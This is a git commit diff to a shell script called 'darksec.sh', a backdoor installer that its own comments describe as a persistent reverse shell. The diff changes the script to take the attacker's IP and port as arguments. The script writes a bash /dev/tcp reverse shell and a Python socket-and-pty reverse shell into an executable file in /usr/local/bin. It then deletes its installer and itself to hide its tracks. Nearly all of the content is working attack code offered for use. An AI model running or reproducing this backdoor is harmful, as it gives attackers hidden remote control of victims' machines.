50761fad314d97efae4adb2df8098fcad65b77f6
DARKSEC <121623691+DARKSECshell@users.noreply.github.com>
2023-12-22 13:03:27 -0300

    darksec.sh

--- darksec.sh
+++ darksec.sh
@@ -3,6 +3,10 @@
 # on the ip and port, choice the type from payload or connection reverse.
 # CREATE IN 2023 BY DARKSEC
 
+if [ -z $2 ];
+then
+          echo -n 'PUT YOUR IP LOCAL AND YOUR PORT FOR REVERSE SHELL'
+else
 darksec="$PWD"
 
 echo '[+] RUNNING BACKDOOR'
@@ -16,14 +20,13 @@ sleep 5
 # ENTER IN DIRETORY
 cd /usr/local/bin
 sleep 1
-echo 'WAIT...'
 
 # CREATE FILES FOR SHELL REVERSE
 touch system.sh
 echo "#\!/bin/bash" > /usr/local/bin/system.sh
-echo "sh -i >& /dev/tcp/<YOUR IP>/1337 0>&1" >> /usr/local/bin/system.sh # your ip here and your port :)
+echo "sh -i >& /dev/tcp/$1/$2 0>&1" >> /usr/local/bin/system.sh # your ip here and your port :)
 sleep 1
-echo "export RHOST="<YOUR IP>";export RPORT=1337;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")' &" >> /usr/local/bin/system.sh # your ip here and your port :)
+echo "export RHOST="$1";export RPORT=$2;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")' &" >> /usr/local/bin/system.sh # your ip here and your port :)
 chmod +x /usr/local/bin/system.sh
 touch root.sh
 chmod +x /usr/local/bin/root.sh
@@ -36,7 +39,7 @@ cd "$darksec"
 cd ..
 
 # DELETE BACKDOOR
-rm -rf shell_persistent
+rm -rf shell_persistent && rm -rf darksec.sh
 
 # SUCCESS, BACKDOOR RUNNING
 echo -n '[+] SUCCESS BACKDOOR RUNNING!'
